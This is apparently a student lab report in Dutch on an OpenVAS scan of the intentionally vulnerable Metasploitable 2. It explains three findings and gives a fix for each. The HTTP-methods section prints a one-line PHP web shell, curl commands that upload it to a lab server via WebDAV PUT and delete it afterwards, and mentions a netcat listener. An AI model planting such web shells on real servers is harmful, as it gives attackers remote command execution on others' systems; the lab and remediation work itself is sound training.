@@ -1,0 +1,64 @@
+Openvas scan is gebeurd met de volgende instellingen:
+local systeem: kali linux
+target systeem: metasploitable OS 2
+portlist: ALL tcp&udp
+scan config: ultimate
+
+De scan 'returnt' 419 resultaten waarvan er 59 vulnerabilities zijn, deze verschillen van 'severity' tussen 10.0 en 2.6. De andere resulaten zijn logs.
+
+[1_scan_metasploitable]
+
+Er is gekozen om de volgende 3 vulnerabilities te 'exploiten'
+
+- Possible backdoor: Ingreslock met severity 10.0
+- MySQL/MariaDB weak password met severity 9.0
+- Test HTTP dangerous methods met severity 7.5
+
+1. Possible Backdoor: Ingreslock
+Poort 1524 is een *backdoor*, als je een connectie hiermee maakt via telnet of netcat dan ben je meteen root van het systeem. 
+Een backdoor is een aanpassing die kwaadaardige gebruikers maken aan het systeem zodat ze later nog steeds direct toegang hebben tot dat systeem waarvan alleen zij op de hoogte zijn. 
+In dit geval is poort 1524 open met root privileges. Er kan ook een aanpassing gedaan worden aan een service op een poort zodat wanneer een speciaal gemaakte 'packet' ernaartoe wordt gestuurd deze een shell teruggeeft, eventueel met root privileges.
+Het is te vergelijken met thuis alle deuren te sluiten behalve de achterdeur, de dieven hoeven niet door de voordeur te gaan maar kunnen simpelweg door de achterdeur binnen komen.
+
+OPLOSSING: het bestand /etc/inetd.conf aanpassen, op regel 8 staat de code die poort 1524 openzet met root privileges, je kan deze regel in commentaar zetten en daarna herstarten.
+
+[2_Ingreslock]
+
+2. MySQL has a weak password, it was possible to login as root with an empty password
+-> Een gebruiker kan via tcp poort 3306 inloggen op mysql door gebruik te maken van root en zonder wachtwoord.
+
+ Dit is een groot risico want dit betekent dat een attacker volledige toegang heeft tot alle data die wordt opgeslagen van de gebruikers. Kredietkaart nummers, inlog gegevens. Een aanvaller kan deze lezen, aanpassen of verwijderen.
+ 
+OPLOSSING:
+Je kan deze vulnerabity dichten door je wachtwoord te veranderen van mysql, 
+dit doe je zo .. (https://support.rackspace.com/how-to/mysql-resetting-a-lost-mysql-root-password/)
+
+[3_MySQL]
+
+3. Test HTTP dangerous methods
+Er bestaat een vulnerabilty waarbij we als gebruiker bestanden kunnen uploaden naar het systeem of verwijderen. Dit is een groot risico want dit betekent dat we onze eigen html of php bestanden kunnen uploaden. In php bestaat er een commando genaamd 'system', dit commando voert systeem commando's uit.
+We kunnen een php file maken die vraagt naar een variabele "c" via een GET en deze variabele plaatsten we in onze system commando. -> <?php $c = $_GET['c']; system('$c'); ?>
+Als we nu in onze url de variabele $c een waarde geven zoals 'ls' dan wordt het commando ls uitgevoerd en toont de browser de output.
+
+[4_HTTP_methods]
+
+Het uploaden van de file naar de browser gebeurt via het commando:
+curl -X PUT http://192.168.136.128/dav/ --upload-file /root/Desktop/exploit.php
+We kunnen naderhand deze file terug verwijderen via het commando:
+curl -X DELETE http://192.168.136.128/dav/exploit.php 
+
+[4.1_HTTP_methods]
+
+Momenteel zijn we user www-data maar door een netcat listener op te zetten en daarna een connectie te maken op het systeem via kali kunnen we geleidijk aan onze positie in het systeem verhogen.
+
+[4.2_HTTP_methods]
+
+OPLOSSING: 
+In de httpd.conf in /etc/apache2 een aanpassing doen namelijk de volgende:
+<Directory "/var/www/*"> 
+ <Limit PUT DELETE>
+  deny from all
+ </Limit>
+</Directory>
+Hierdoor accepteert de server geen enkele PUT en DELETE request.
+
